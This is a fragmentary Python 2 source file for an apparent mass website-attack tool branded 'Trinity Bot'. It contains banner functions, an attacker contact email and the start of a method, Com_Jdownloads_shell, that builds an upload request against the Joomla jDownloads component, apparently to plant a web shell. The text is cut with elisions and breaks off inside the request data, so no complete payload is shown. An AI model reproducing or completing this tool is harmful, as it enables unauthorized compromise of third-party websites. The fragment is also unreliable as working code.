...
def logo():
 print"""{t} 
                         [=] Trinity Bot [=]
                         It's Private for Trinity """.format(t=la5dhar)
def zabour():
 print ('''
...
{re} ~{r}> {r}({c}C{r}){c}opyright 2018 - Trinity \033[00m""") .format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
def samara():
...
'''
        ...
        self.EMail = 'trinityreturn@protonmail.com'
...
"""
    ...
    def Com_Jdownloads_shell(self, site):
        try:
            ...
            post_data = {
                'name': 'aron-tn',
                'mail': 'trinityreturn@protonmail.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
